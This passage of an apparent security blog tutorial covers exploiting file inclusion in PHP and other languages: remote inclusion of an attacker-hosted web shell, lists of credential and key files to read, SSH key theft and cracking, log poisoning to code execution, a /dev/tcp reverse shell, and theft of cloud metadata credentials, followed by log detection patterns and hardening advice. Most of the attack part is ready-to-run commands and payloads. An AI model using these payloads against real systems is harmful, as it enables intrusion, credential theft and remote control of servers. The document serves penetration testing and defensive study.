+    
+
+      
+        
+        
+        <div class="block heading-block heading-level-3">
+          <h3 class="section-heading">
+            
+            <span class="heading-text">phpinfo() + Race Condition</span>
+          </h3>
+        </div>
+
+      
+    
+
+      
+        <div class="block text-block"><p>If <code>phpinfo()</code> is exposed, it reveals the exact path of uploaded temp files in real time. Automation:<br>
+1. Script sends a multipart upload in a loop<br>
+2. Second thread reads phpinfo() to get the temp path<br>
+3. Third thread immediately includes the temp path</p>
+<p>Tools: <code>phpinfolfi.py</code> (InsomniaSec). Reliable when phpinfo() is accessible.</p></div>
+
+      
+    
+
+      
+        
+        
+        <div class="block heading-block heading-level-2">
+          <h2 class="section-heading">
+            <span class="heading-index">07</span>
+            <span class="heading-text">Remote File Inclusion (RFI)</span>
+          </h2>
+        </div>
+
+      
+    
+
+      
+        <div class="block text-block"><p><strong>RFI</strong> is when the include function fetches a file from a remote URL. It requires <code>allow_url_include=On</code> (off by default since PHP 5.2) and <code>allow_url_fopen=On</code>.</p></div>
+
+      
+    
+
+      
+        <div class="block api-code-block">
+          <div class="code-header">
+            <span class="lang-badge">text</span>
+            
+          </div>
+          <pre><code class="language-text">?page=http://attacker.com/shell.php
+?page=http://attacker.com/shell.txt</code></pre>
+        </div>
+
+      
+    
+
+      
+        <div class="block text-block"><p>The <code>.txt</code> extension works just as well — PHP executes the response body as PHP regardless of the remote file extension.</p>
+<p><strong>Setup:</strong></p></div>
+
+      
+    
+
+      
+        <div class="block api-code-block">
+          <div class="code-header">
+            <span class="lang-badge">bash</span>
+            
+          </div>
+          <pre><code class="language-bash"># Host shell on your attacker machine
+echo &#39;&lt;?php system($_GET[&#34;cmd&#34;]); ?&gt;&#39; &gt; shell.php
+python3 -m http.server 80</code></pre>
+        </div>
+
+      
+    
+
+      
+        <div class="block text-block"><p>Then: <code>?page=http://YOUR_IP/shell.php&amp;cmd=id</code></p>
+<p><strong>Why it's rare in modern environments:</strong><br>
+- <code>allow_url_include</code> is disabled by default<br>
+- WAFs typically block outbound HTTP from web server processes<br>
+- PHP 7+ changed defaults aggressively</p>
+<p>If you're testing an old PHP app (5.x era) or a CTF box, always try RFI — it's the easiest path to RCE when it works.</p></div>
+
+      
+    
+
+      
+        
+        
+        <div class="block heading-block heading-level-2">
+          <h2 class="section-heading">
+            <span class="heading-index">08</span>
+            <span class="heading-text">Sensitive Files — Linux</span>
+          </h2>
+        </div>
+
+      
+    
+
+      
+        <div class="block text-block"><p>When you have LFI and can't reach RCE immediately, reading sensitive files is your primary objective. These are the targets that matter:</p></div>
+
+      
+    
+
+      
+        
+        
+        <div class="block heading-block heading-level-3">
+          <h3 class="section-heading">
+            
+            <span class="heading-text">Credentials &amp; Auth</span>
+          </h3>
+        </div>
+
+      
+    
+
+      
+        <div class="block api-code-block">
+          <div class="code-header">
+            <span class="lang-badge">text</span>
+            
+          </div>
+          <pre><code class="language-text">/etc/passwd                    — user list, home dirs, shells
+/etc/shadow                    — hashed passwords (needs root read)
+/etc/group                     — group memberships
+/home/USER/.ssh/id_rsa         — SSH private key
+/home/USER/.ssh/authorized_keys
+/root/.ssh/id_rsa
+/home/USER/.bash_history       — command history (goldmine)
+/root/.bash_history
+/home/USER/.mysql_history
+/home/USER/.psql_history</code></pre>
+        </div>
+
+      
+    
+
+      
+        
+        
+        <div class="block heading-block heading-level-3">
+          <h3 class="section-heading">
+            
+            <span class="heading-text">Application Config</span>
+          </h3>
+        </div>
+
+      
+    
+
+      
+        <div class="block api-code-block">
+          <div class="code-header">
+            <span class="lang-badge">text</span>
+            
+          </div>
+          <pre><code class="language-text">/var/www/html/config.php
+/var/www/html/.env
+/var/www/html/wp-config.php    — WordPress DB creds
+/var/www/html/configuration.php  — Joomla
+/var/www/html/config/database.php  — Laravel
+/etc/phpmyadmin/config.inc.php
+/etc/mysql/my.cnf
+/etc/mysql/mysql.conf.d/mysqld.cnf</code></pre>
+        </div>
+
+      
+    
+
+      
+        
+        
+        <div class="block heading-block heading-level-3">
+          <h3 class="section-heading">
+            
+            <span class="heading-text">Web Server Config</span>
+          </h3>
+        </div>
+
+      
+    
+
+      
+        <div class="block api-code-block">
+          <div class="code-header">
+            <span class="lang-badge">text</span>
+            
+          </div>
+          <pre><code class="language-text">/etc/apache2/apache2.conf
+/etc/apache2/sites-enabled/000-default.conf  — virtual host paths
+/etc/nginx/nginx.conf
+/etc/nginx/sites-enabled/default
+/etc/httpd/conf/httpd.conf</code></pre>
+        </div>
+
+      
+    
+
+      
+        
+        
+        <div class="block heading-block heading-level-3">
+          <h3 class="section-heading">
+            
+            <span class="heading-text">System / Kernel Info</span>
+          </h3>
+        </div>
+
+      
+    
+
+      
+        <div class="block api-code-block">
+          <div class="code-header">
+            <span class="lang-badge">text</span>
+            
+          </div>
+          <pre><code class="language-text">/proc/version                  — kernel version and compiler info
+/proc/cmdline                  — kernel boot params (sometimes creds)
+/proc/self/environ             — current process env vars (HTTP headers here)
+/proc/self/cmdline             — exact command line of current process
+/proc/self/cwd                 — symlink to working dir (resolve with readlink)
+/proc/self/fd/[N]              — file descriptors (fd/0=stdin, fd/1=stdout)
+/proc/net/tcp                  — open TCP connections (hex encoded)
+/proc/net/arp                  — ARP table (internal network mapping)
+/etc/os-release                — distro info
+/etc/hostname
+/etc/hosts
+/etc/resolv.conf               — DNS servers
+/etc/crontab
+/var/spool/cron/crontabs/root</code></pre>
+        </div>
+
+      
+    
+
+      
+        
+        
+        <div class="block heading-block heading-level-3">
+          <h3 class="section-heading">
+            
+            <span class="heading-text">Reading `/proc/net/tcp`</span>
+          </h3>
+        </div>
+
+      
+    
+
+      
+        <div class="block text-block"><p>This file lists all TCP connections in hex. Column 2 is local address:port, column 3 is remote. Port 80 in hex is <code>0050</code>.</p></div>
+
+      
+    
+
+      
+        <div class="block api-code-block">
+          <div class="code-header">
+            <span class="lang-badge">text</span>
+            
+          </div>
+          <pre><code class="language-text"> sl  local_address rem_address   st
+  0: 0100007F:1F91 00000000:0000 0A   ← 127.0.0.1:8081 listening</code></pre>
+        </div>
+
+      
+    
+
+      
+        <div class="block text-block"><p>Reverse the byte order of each group and convert to decimal to get actual IP:port. This reveals internal services not visible from outside.</p></div>
+
+      
+    
+
+      
+        
+        
+        <div class="block heading-block heading-level-3">
+          <h3 class="section-heading">
+            
+            <span class="heading-text">SSH Keys — The Big Win</span>
+          </h3>
+        </div>
+
+      
+    
+
+      
+        <div class="block text-block"><p>If you find an SSH private key:</p></div>
+
+      
+    
+
+      
+        <div class="block api-code-block">
+          <div class="code-header">
+            <span class="lang-badge">bash</span>
+            
+          </div>
+          <pre><code class="language-bash">curl -s &#39;http://target/?page=../../../../home/john/.ssh/id_rsa&#39; &gt; john_id_rsa
+chmod 600 john_id_rsa
+ssh -i john_id_rsa john@target</code></pre>
+        </div>
+
+      
+    
+
+      
+        <div class="block text-block"><p>If the key is passphrase-protected:</p></div>
+
+      
+    
+
+      
+        <div class="block api-code-block">
+          <div class="code-header">
+            <span class="lang-badge">bash</span>
+            
+          </div>
+          <pre><code class="language-bash">ssh2john john_id_rsa &gt; john.hash
+john --wordlist=/usr/share/wordlists/rockyou.txt john.hash</code></pre>
+        </div>
+
+      
+    
+
+      
+        
+        
+        <div class="block heading-block heading-level-2">
+          <h2 class="section-heading">
+            <span class="heading-index">09</span>
+            <span class="heading-text">Sensitive Files — Windows</span>
+          </h2>
+        </div>
+
+      
+    
+
+      
+        <div class="block text-block"><p>Windows paths use <code>\</code> but <code>/</code> also works in most PHP builds on Windows. Include both variants:</p></div>
+
+      
+    
+
+      
+        
+        
+        <div class="block heading-block heading-level-3">
+          <h3 class="section-heading">
+            
+            <span class="heading-text">System Files</span>
+          </h3>
+        </div>
+
+      
+    
+
+      
+        <div class="block api-code-block">
+          <div class="code-header">
+            <span class="lang-badge">text</span>
+            
+          </div>
+          <pre><code class="language-text">C:/Windows/win.ini                         — proof of file read
+C:/Windows/System32/drivers/etc/hosts
+C:/Windows/repair/SAM                      — hashed local creds (if readable)
+C:/Windows/repair/SYSTEM
+C:/Windows/System32/config/SAM             — (usually locked by OS)
+C:/Windows/System32/config/SYSTEM
+C:/Windows/System32/config/security</code></pre>
+        </div>
+
+      
+    
+
+      
+        
+        
+        <div class="block heading-block heading-level-3">
+          <h3 class="section-heading">
+            
+            <span class="heading-text">Web Server Configs</span>
+          </h3>
+        </div>
+
+      
+    
+
+      
+        <div class="block api-code-block">
+          <div class="code-header">
+            <span class="lang-badge">text</span>
+            
+          </div>
+          <pre><code class="language-text">C:/xampp/apache/conf/httpd.conf
+C:/xampp/FileZillaFTP/FileZilla Server.xml  — FTP creds
+C:/xampp/MercuryMail/MERCURY.INI
+C:/xampp/sendmail/sendmail.ini
+C:/xampp/mysql/data/mysql/user.MYD         — MySQL user table
+C:/Program Files/Apache Group/Apache2/conf/httpd.conf
+C:/inetpub/wwwroot/web.config              — IIS config, connection strings
+C:/inetpub/wwwroot/global.asa</code></pre>
+        </div>
+
+      
+    
+
+      
+        
+        
+        <div class="block heading-block heading-level-3">
+          <h3 class="section-heading">
+            
+            <span class="heading-text">IIS Logs</span>
+          </h3>
+        </div>
+
+      
+    
+
+      
+        <div class="block api-code-block">
+          <div class="code-header">
+            <span class="lang-badge">text</span>
+            
+          </div>
+          <pre><code class="language-text">C:/inetpub/logs/LogFiles/W3SVC1/u_ex[DATE].log
+C:/Windows/System32/LogFiles/HTTPERR/httperr.log</code></pre>
+        </div>
+
+      
+    
+
+      
+        
+        
+        <div class="block heading-block heading-level-3">
+          <h3 class="section-heading">
+            
+            <span class="heading-text">Application Credentials</span>
+          </h3>
+        </div>
+
+      
+    
+
+      
+        <div class="block api-code-block">
+          <div class="code-header">
+            <span class="lang-badge">text</span>
+            
+          </div>
+          <pre><code class="language-text">C:/Users/[USER]/AppData/Roaming/FileZilla/recentservers.xml
+C:/Users/[USER]/AppData/Roaming/FileZilla/sitemanager.xml
+C:/xampp/FileZillaFTP/FileZilla Server.xml
+C:/Program Files/FileZilla Server/FileZilla Server.xml</code></pre>
+        </div>
+
+      
+    
+
+      
+        <div class="block text-block"><p><strong>win.ini as a quick check:</strong><br>
+If <code>?page=C:/Windows/win.ini</code> returns the content starting with <code>[fonts]</code>, you have confirmed file read on Windows.</p></div>
+
+      
+    
+
+      
+        
+        
+        <div class="block heading-block heading-level-2">
+          <h2 class="section-heading">
+            <span class="heading-index">10</span>
+            <span class="heading-text">Fuzzing for LFI</span>
+          </h2>
+        </div>
+
+      
+    
+
+      
+        <div class="block text-block"><p>Manual traversal is slow. Automate it with <code>ffuf</code> and a wordlist.</p></div>
+
+      
+    
+
+      
+        
+        
+        <div class="block heading-block heading-level-3">
+          <h3 class="section-heading">
+            
+            <span class="heading-text">Basic ffuf fuzz</span>
+          </h3>
+        </div>
+
+      
+    
+
+      
+        <div class="block api-code-block">
+          <div class="code-header">
+            <span class="lang-badge">bash</span>
+            
+          </div>
+          <pre><code class="language-bash">ffuf -u &#39;http://target/index.php?page=FUZZ&#39; \
+  -w /usr/share/seclists/Fuzzing/LFI/LFI-gracefulsecurity-linux.txt \
+  -fw 0 -mc 200</code></pre>
+        </div>
+
+      
+    
+
+      
+        
+        
+        <div class="block heading-block heading-level-3">
+          <h3 class="section-heading">
+            
+            <span class="heading-text">With traversal prefix</span>
+          </h3>
+        </div>
+
+      
+    
+
+      
+        <div class="block api-code-block">
+          <div class="code-header">
+            <span class="lang-badge">bash</span>
+            
+          </div>
+          <pre><code class="language-bash">ffuf -u &#39;http://target/index.php?page=FUZZ&#39; \
+  -w /usr/share/seclists/Fuzzing/LFI/LFI-gracefulsecurity-linux.txt \
+  -b &#39;PHPSESSID=abcd1234&#39; \
+  -H &#39;User-Agent: Mozilla/5.0&#39; \
+  -mc 200 -fw 0</code></pre>
+        </div>
+
+      
+    
+
+      
+        
+        
+        <div class="block heading-block heading-level-3">
+          <h3 class="section-heading">
+            
+            <span class="heading-text">SecLists LFI wordlists</span>
+          </h3>
+        </div>
+
+      
+    
+
+      
+        <div class="block api-code-block">
+          <div class="code-header">
+            <span class="lang-badge">text</span>
+            
+          </div>
+          <pre><code class="language-text">/usr/share/seclists/Fuzzing/LFI/LFI-gracefulsecurity-linux.txt
+/usr/share/seclists/Fuzzing/LFI/LFI-gracefulsecurity-windows.txt
+/usr/share/seclists/Fuzzing/LFI/LFI-Jhaddix.txt
+/usr/share/seclists/Fuzzing/LFI/LFI-etc-files-of-interest.txt</code></pre>
+        </div>
+
+      
+    
+
+      
+        
+        
+        <div class="block heading-block heading-level-3">
+          <h3 class="section-heading">
+            
+            <span class="heading-text">LFImap</span>
+          </h3>
+        </div>
+
+      
+    
+
+      
+        <div class="block text-block"><p><code>lfimap</code> automates wrapper testing, RCE checking, and log poisoning:</p></div>
+
+      
+    
+
+      
+        <div class="block api-code-block">
+          <div class="code-header">
+            <span class="lang-badge">bash</span>
+            
+          </div>
+          <pre><code class="language-bash">pip3 install lfimap
+lfimap -U &#39;http://target/index.php?page=test&#39; --lfi --rfi --rce</code></pre>
+        </div>
+
+      
+    
+
+      
+        
+        
+        <div class="block heading-block heading-level-3">
+          <h3 class="section-heading">
+            
+            <span class="heading-text">Burp Suite Intruder</span>
+          </h3>
+        </div>
+
+      
+    
+
+      
+        <div class="block text-block"><p>For authenticated applications, use Burp Intruder with a Sniper attack on the file parameter using the same SecLists wordlists. Filter by response length deviation from baseline.</p></div>
+
+      
+    
+
+      
+        
+        
+        <div class="block heading-block heading-level-2">
+          <h2 class="section-heading">
+            <span class="heading-index">11</span>
+            <span class="heading-text">Full Exploitation Workflow</span>
+          </h2>
+        </div>
+
+      
+    
+
+      
+        
+        
+        <div class="block heading-block heading-level-3">
+          <h3 class="section-heading">
+            
+            <span class="heading-text">Step 1 — Confirm the vulnerability</span>
+          </h3>
+        </div>
+
+      
+    
+
+      
+        <div class="block api-code-block">
+          <div class="code-header">
+            <span class="lang-badge">bash</span>
+            
+          </div>
+          <pre><code class="language-bash">curl -s &#39;http://target/index.php?page=../../../../etc/passwd&#39;
+# Look for: root:x:0:0:root</code></pre>
+        </div>
+
+      
+    
+
+      
+        
+        
+        <div class="block heading-block heading-level-3">
+          <h3 class="section-heading">
+            
+            <span class="heading-text">Step 2 — Enumerate the environment</span>
+          </h3>
+        </div>
+
+      
+    
+
+      
+        <div class="block api-code-block">
+          <div class="code-header">
+            <span class="lang-badge">bash</span>
+            
+          </div>
+          <pre><code class="language-bash"># Kernel and OS
+curl -s &#39;http://target/?page=../../../../proc/version&#39;
+curl -s &#39;http://target/?page=../../../../etc/os-release&#39;
+
+# Running user
+curl -s &#39;http://target/?page=../../../../proc/self/environ&#39;
+
+# Internal services
+curl -s &#39;http://target/?page=../../../../proc/net/tcp&#39;
+
+# Web root (often disclosed by error or proc/self/cwd)
+curl -s &#39;http://target/?page=../../../../proc/self/cmdline&#39; | tr &#39;\0&#39; &#39; &#39;</code></pre>
+        </div>
+
+      
+    
+
+      
+        
+        
+        <div class="block heading-block heading-level-3">
+          <h3 class="section-heading">
+            
+            <span class="heading-text">Step 3 — Read sensitive files</span>
+          </h3>
+        </div>
+
+      
+    
+
+      
+        <div class="block api-code-block">
+          <div class="code-header">
+            <span class="lang-badge">bash</span>
+            
+          </div>
+          <pre><code class="language-bash"># Application config first
+curl -s &#39;http://target/?page=php://filter/convert.base64-encode/resource=config.php&#39; | base64 -d
+curl -s &#39;http://target/?page=php://filter/convert.base64-encode/resource=../.env&#39; | base64 -d
+
+# SSH keys
+for user in $(curl -s &#39;http://target/?page=../../../../etc/passwd&#39; | cut -d: -f1); do
+  echo &#34;[*] Trying $user&#34;
+  curl -s &#34;http://target/?page=../../../../home/$user/.ssh/id_rsa&#34;
+done</code></pre>
+        </div>
+
+      
+    
+
+      
+        
+        
+        <div class="block heading-block heading-level-3">
+          <h3 class="section-heading">
+            
+            <span class="heading-text">Step 4 — Escalate to RCE</span>
+          </h3>
+        </div>
+
+      
+    
+
+      
+        <div class="block api-code-block">
+          <div class="code-header">
+            <span class="lang-badge">bash</span>
+            
+          </div>
+          <pre><code class="language-bash"># Try wrappers first (no prereqs)
+curl -s &#39;http://target/?page=php://filter/convert.base64-encode/resource=/etc/passwd&#39;
+
+# If allow_url_include=On:
+curl -X POST &#39;http://target/?page=php://input&amp;cmd=id&#39; --data &#39;&lt;?php system($_GET[&#34;cmd&#34;]); ?&gt;&#39;
+
+# Log poisoning
+curl -A &#39;&lt;?php system($_GET[&#34;cmd&#34;]); ?&gt;&#39; &#39;http://target/&#39;
+curl -s &#39;http://target/?page=../../../../var/log/apache2/access.log&amp;cmd=id&#39;</code></pre>
+        </div>
+
+      
+    
+
+      
+        
+        
+        <div class="block heading-block heading-level-3">
+          <h3 class="section-heading">
+            
+            <span class="heading-text">Step 5 — Reverse shell</span>
+          </h3>
+        </div>
+
+      
+    
+
+      
+        <div class="block api-code-block">
+          <div class="code-header">
+            <span class="lang-badge">bash</span>
+            
+          </div>
+          <pre><code class="language-bash"># URL-encode the reverse shell command
+curl -s &#39;http://target/?page=../../../../var/log/apache2/access.log&amp;cmd=bash+-c+%27bash+-i+%3E%26+%2Fdev%2Ftcp%2FYOUR_IP%2F4444+0%3E%261%27&#39;
+
+# Listener
+nc -lvnp 4444</code></pre>
+        </div>
+
+      
+    
+
+      
+        
+        
+        <div class="block heading-block heading-level-2">
+          <h2 class="section-heading">
+            <span class="heading-index">12</span>
+            <span class="heading-text">LFI in Other Languages</span>
+          </h2>
+        </div>
+
+      
+    
+
+      
+        <div class="block text-block"><p>LFI-class vulnerabilities exist outside PHP wherever user input controls a file path.</p></div>
+
+      
+    
+
+      
+        
+        
+        <div class="block heading-block heading-level-3">
+          <h3 class="section-heading">
+            
+            <span class="heading-text">Python (Flask/Django)</span>
+          </h3>
+        </div>
+
+      
+    
+
+      
+        <div class="block api-code-block">
+          <div class="code-header">
+            <span class="lang-badge">python</span>
+            
+          </div>
+          <pre><code class="language-python"># Vulnerable
+@app.route(&#39;/download&#39;)
+def download():
+    filename = request.args.get(&#39;file&#39;)
+    return send_file(filename)  # no sanitisation</code></pre>
+        </div>
+
+      
+    
+
+      
+        <div class="block text-block"><p>Exploit: <code>?file=../../../../etc/passwd</code></p>
+<p><code>send_file()</code> won't execute Python, but you can read any file the process can access.</p></div>
+
+      
+    
+
+      
+        
+        
+        <div class="block heading-block heading-level-3">
+          <h3 class="section-heading">
+            
+            <span class="heading-text">Java (Spring/Servlet)</span>
+          </h3>
+        </div>
+
+      
+    
+
+      
+        <div class="block api-code-block">
+          <div class="code-header">
+            <span class="lang-badge">java</span>
+            
+          </div>
+          <pre><code class="language-java">// Vulnerable
+String file = request.getParameter(&#34;page&#34;);
+new FileInputStream(&#34;/var/www/&#34; + file);</code></pre>
+        </div>
+
+      
+    
+
+      
+        <div class="block text-block"><p>Java path traversal works identically. <code>../</code> sequences work even on Windows with Spring.</p></div>
+
+      
+    
+
+      
+        
+        
+        <div class="block heading-block heading-level-3">
+          <h3 class="section-heading">
+            
+            <span class="heading-text">Node.js</span>
+          </h3>
+        </div>
+
+      
+    
+
+      
+        <div class="block api-code-block">
+          <div class="code-header">
+            <span class="lang-badge">javascript</span>
+            
+          </div>
+          <pre><code class="language-javascript">// Vulnerable
+app.get(&#39;/file&#39;, (req, res) =&gt; {
+  fs.readFile(&#39;./public/&#39; + req.query.name, (err, data) =&gt; {
+    res.send(data);
+  });
+});</code></pre>
+        </div>
+
+      
+    
+
+      
+        <div class="block text-block"><p><code>?name=../../../../etc/passwd</code> — identical traversal.</p>
+<p><strong>Key difference:</strong> These languages don't execute included files as code (no direct LFI→RCE via wrappers). Your goal is information disclosure: config files, <code>.env</code>, <code>/proc</code>, AWS metadata at <code>169.254.169.254</code>.</p></div>
+
+      
+    
+
+      
+        
+        
+        <div class="block heading-block heading-level-2">
+          <h2 class="section-heading">
+            <span class="heading-index">13</span>
+            <span class="heading-text">Cloud Metadata via LFI (SSRF Adjacent)</span>
+          </h2>
+        </div>
+
+      
+    
+
+      
+        <div class="block text-block"><p>If the vulnerable application runs on AWS, GCP, or Azure, and the LFI allows fetching URLs (RFI path or SSRF), the cloud metadata endpoint is a critical target.</p>
+<p><strong>AWS IMDSv1:</strong></p></div>
+
+      
+    
+
+      
+        <div class="block api-code-block">
+          <div class="code-header">
+            <span class="lang-badge">text</span>
+            
+          </div>
+          <pre><code class="language-text">?page=http://169.254.169.254/latest/meta-data/
+?page=http://169.254.169.254/latest/meta-data/iam/security-credentials/
+?page=http://169.254.169.254/latest/meta-data/iam/security-credentials/ROLE_NAME</code></pre>
+        </div>
+
+      
+    
+
+      
+        <div class="block text-block"><p>Returns: <code>AccessKeyId</code>, <code>SecretAccessKey</code>, <code>Token</code> — temporary AWS credentials. Use them with <code>aws-cli</code> to enumerate/exfiltrate S3, EC2, etc.</p>
+<p><strong>GCP:</strong></p></div>
+
+      
+    
+
+      
+        <div class="block api-code-block">
+          <div class="code-header">
+            <span class="lang-badge">text</span>
+            
+          </div>
+          <pre><code class="language-text">?page=http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token</code></pre>
+        </div>
+
+      
+    
+
+      
+        <div class="block text-block"><p><strong>Azure:</strong></p></div>
+
+      
+    
+
+      
+        <div class="block api-code-block">
+          <div class="code-header">
+            <span class="lang-badge">text</span>
+            
+          </div>
+          <pre><code class="language-text">?page=http://169.254.169.254/metadata/instance?api-version=2021-02-01</code></pre>
+        </div>
+
+      
+    
+
+      
+        <div class="block text-block"><p>This is only reachable if <code>allow_url_fopen=On</code> AND <code>allow_url_include=On</code>, or via a server-side request from a framework. Pure path traversal LFI won't reach network endpoints.</p></div>
+
+      
+    
+
+      
+        
+        
+        <div class="block heading-block heading-level-2">
+          <h2 class="section-heading">
+            <span class="heading-index">14</span>
+            <span class="heading-text">Detection &amp; Defence</span>
+          </h2>
+        </div>
+
+      
+    
+
+      
+        <div class="block text-block"><p><strong>For defenders — what to look for in logs:</strong></p></div>
+
+      
+    
+
+      
+        <div class="block api-code-block">
+          <div class="code-header">
+            <span class="lang-badge">text</span>
+            
+          </div>
+          <pre><code class="language-text">../  in URL parameters
+%2e%2e  URL encoded traversal
+php://  stream wrapper prefix
+file://  scheme prefix
+/etc/passwd  or other sensitive paths in parameters
+data://  base64 payloads</code></pre>
+        </div>
+
+      
+    
+
+      
+        <div class="block text-block"><p><strong>Grep log files:</strong></p></div>
+
+      
+    
+
+      
+        <div class="block api-code-block">
+          <div class="code-header">
+            <span class="lang-badge">bash</span>
+            
+          </div>
+          <pre><code class="language-bash">grep -E &#39;(\.\./|%2e%2e|php://|file://|/etc/passwd|/etc/shadow)&#39; /var/log/apache2/access.log</code></pre>
+        </div>
+
+      
+    
+
+      
+        <div class="block text-block"><p><strong>Hardening:</strong></p></div>
+
+      
+    
+
+      
+        <div class="block table-wrap">
+          <table class="table-block">
+            <thead>
+              <tr>
+                <th>Control</th><th>How</th>
+              </tr>
+            </thead>
+            <tbody>
+              
+                <tr>
+                  <td>Disable dangerous PHP settings</td><td>`allow_url_include=Off`, `allow_url_fopen=Off` in `php.ini`</td>
+                </tr>
+              
+                <tr>
+                  <td>Use a whitelist</td><td>Only allow known filenames, not arbitrary paths</td>
+                </tr>
+              
+                <tr>
+                  <td>`realpath()` + prefix check</td><td>Resolve the real path then verify it starts with the expected directory</td>
+                </tr>
+              
+                <tr>
+                  <td>`open_basedir`</td><td>Restrict PHP file access to specific directories</td>
+                </tr>
+              
+                <tr>
+                  <td>Run web server as low-privilege user</td><td>Limits what files are readable even if LFI exists</td>
+                </tr>
+              
+                <tr>
+                  <td>Disable phpinfo()</td><td>Removes temp file path disclosure</td>
+                </tr>
+              
+                <tr>
+                  <td>Remove unnecessary PHP extensions</td><td>`expect`, `zip`, `phar` wrappers are often unneeded</td>
+                </tr>
+              
+            </tbody>
+          </table>
+        </div>
+
+      
+    
+
+      
+        <div class="block text-block"><p><strong>Safe code pattern:</strong></p></div>
+
+      
+    
+
+      
+        <div class="block api-code-block">
+          <div class="code-header">
+            <span class="lang-badge">php</span>
+            
+          </div>
+          <pre><code class="language-php">$allowed = [&#39;home&#39;, &#39;about&#39;, &#39;contact&#39;];
+$page = $_GET[&#39;page&#39;];
+if (!in_array($page, $allowed)) {
+    die(&#39;Invalid page&#39;);
+}
+include($page . &#39;.php&#39;);</code></pre>
+        </div>
+
+      
+    
+
+      
+        <div class="block text-block"><p>Whitelist input — never trust path components from the user.</p></div>
+
+      
+    
+  </div>
+
+  
+  
+
+
+  </div>
+
+  <nav id="tocBar" class="toc-bar" hidden></nav>
+
+</article>
+
+<button id="backToTop" hidden aria-label="Back to top">
+  <svg class="bt-ring" width="40" height="40" viewBox="0 0 40 40" aria-hidden="true">
+    <circle class="bt-ring-bg" cx="20" cy="20" r="17" fill="none" stroke-width="2"/>
+    <circle class="bt-ring-fg" cx="20" cy="20" r="17" fill="none" stroke-width="2"
+            stroke-dasharray="106.8" stroke-dashoffset="106.8"/>
+  </svg>
+  <svg class="bt-arrow" width="15" height="15" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true">
+    <path d="M12 19V5M5 12l7-7 7 7"/>
+  </svg>
+</button>
+
+
+
+
+<section class="related-posts">
+  <div class="section-header">
+    <span class="section-label">// related</span>
+    <span class="section-line"></span>
+  </div>
+  <div class="related-grid">
+    
+      
+      <a href="/axiom-blog-site/post/file-transfers-windows-linux" class="post-card post-card-related card-cat-notes">
+        <div class="post-card-body">
+          <div class="post-card-toprow">
+            <div class="post-card-badges">
+              
+                <span class="cat-badge cat-notes">Notes</span>
+              
+            </div>
+          </div>
+          <h2 class="post-card-title">File Transfers — Moving Files on Windows and Linux</h2>
+          <div class="post-card-meta"><time>2026-06-04</time></div>
+          <p class="post-card-summary">Every reliable technique for uploading and downloading files during an engagement: Python servers, PowerShell cradles, certutil, base64 encoding, netcat, SMB, SCP, LOLBAS, and evasion considerations.</p>
+        </div>
+      </a>
+    
+      
+      <a href="/axiom-blog-site/post/ctf-recurring-patterns" class="post-card post-card-related card-cat-notes">
+        <div class="post-card-body">
+          <div class="post-card-toprow">
+            <div class="post-card-badges">
+              
+                <span class="cat-badge cat-notes">Notes</span>
+              
+            </div>
+          </div>
+          <h2 class="post-card-title">CTF Notes — Patterns That Come Up Every Time</h2>
+          <div class="post-card-meta"><time>2026-06-17</time></div>
+          <p class="post-card-summary">Not a walkthrough — a pattern library. The specific techniques that reappear across pwn, web, crypto, and forensics challenges often enough that recognising them on sight, rather than re-deriving them, is what actually separates a fast solve from a slow one.</p>
+        </div>
+      </a>
+    
+      
+      <a href="/axiom-blog-site/post/windows-fundamentals" class="post-card post-card-related card-cat-learn">
+        <div class="post-card-body">
+          <div class="post-card-toprow">
+            <div class="post-card-badges">
+              
+                <span class="cat-badge cat-learn">Learn</span>
+              
+            </div>
+          </div>
+          <h2 class="post-card-title">Windows Fundamentals — The Complete Foundation</h2>
+          <div class="post-card-meta"><time>2026-06-04</time></div>
+          <p class="post-card-summary">Architecture, filesystem, registry, users, NTFS permissions, processes, services, PowerShell, Active Directory, event logs, and a red team lens on every layer.</p>
+        </div>
+      </a>
+    
+  </div>
+</section>
+
+
+
+
+    </div>
+  </main>
+
+  <nav class="mobile-bottom-nav">
+    <a href="/axiom-blog-site/" aria-label="Home">
+      <svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
+        <path d="M3 9l9-7 9 7v11a2 2 0 0 1-2 2H5a2 2 0 0 1-2-2z"/><path d="M9 22V12h6v10"/>
+      </svg>
+      <span>Home</span>
+    </a>
+    <button type="button" id="mobileBottomSearch" aria-label="Search">
+      <svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
+        <circle cx="11" cy="11" r="8"/><path d="m21 21-4.35-4.35"/>
+      </svg>
+      <span>Search</span>
+    </button>
+    <a href="/axiom-blog-site/#categories" aria-label="Categories">
+      <svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
+        <rect x="3" y="3" width="7" height="7" rx="1"/><rect x="14" y="3" width="7" height="7" rx="1"/><rect x="3" y="14" width="7" height="7" rx="1"/><rect x="14" y="14" width="7" height="7" rx="1"/>
+      </svg>
+      <span>Categories</span>
+    </a>
+  </nav>
+
+  <footer class="site-footer">
+    <div class="container">
+      <div class="footer-left">
+        <a href="/axiom-blog-site/" class="footer-brand">Axiom</a>
+      </div>
+      <nav class="footer-nav">
+        <a href="/axiom-blog-site/about" class="footer-link">About</a>
+        <a href="/axiom-blog-site/tags" class="footer-link">Tags</a>
+        <a href="/axiom-blog-site/privacy" class="footer-link">Privacy</a>
+        <a href="/axiom-blog-site/feed.xml" class="footer-link">RSS</a>
+      </nav>
+    </div>
+  </footer>
+
+  <script src="/axiom-blog-site/static/js/highlight.min.js?v=2"></script>
+  <script src="/axiom-blog-site/static/js/hljs-powershell.min.js"></script>
+  <script src="/axiom-blog-site/static/js/hljs-x86asm.min.js"></script>
+  <script src="/axiom-blog-site/static/js/hljs-dos.min.js"></script>
+  <script src="/axiom-blog-site/static/js/hljs-http.min.js"></script>
+  <script src="/axiom-blog-site/static/js/hljs-nginx.min.js"></script>
+  <script src="/axiom-blog-site/static/js/hljs-apache.min.js"></script>
+  <script src="/axiom-blog-site/static/js/hljs-dockerfile.min.js"></script>
+  <script src="/axiom-blog-site/static/js/hljs-armasm.min.js"></script>
+  <script src="/axiom-blog-site/static/js/hljs-awk.min.js"></script>
+  <script src="/axiom-blog-site/static/js/hljs-cmake.min.js"></script>
